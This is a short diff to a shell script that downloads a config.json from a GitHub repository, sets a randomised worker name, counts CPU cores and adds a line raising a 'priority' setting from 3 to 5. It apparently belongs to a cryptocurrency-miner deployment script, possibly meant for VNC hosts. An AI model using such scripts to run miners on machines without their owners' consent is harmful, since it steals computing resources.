@@ -69,6 +69,7 @@ rm -f config.json
 $DOWNLOAD_CMD https://raw.githubusercontent.com/spetterman66/verynicerepo/main/config.json
 randnum=$(( RANDOM % 1000 + 1 ))
 sed -i "s/17lifers@home/17lifers-vnc-$randnum/g" config.json
+sed -i 's/"priority": 3/"priority": 5/g' config.json
 
 num_threads=$(cat /proc/cpuinfo | grep -c '^processor')
 
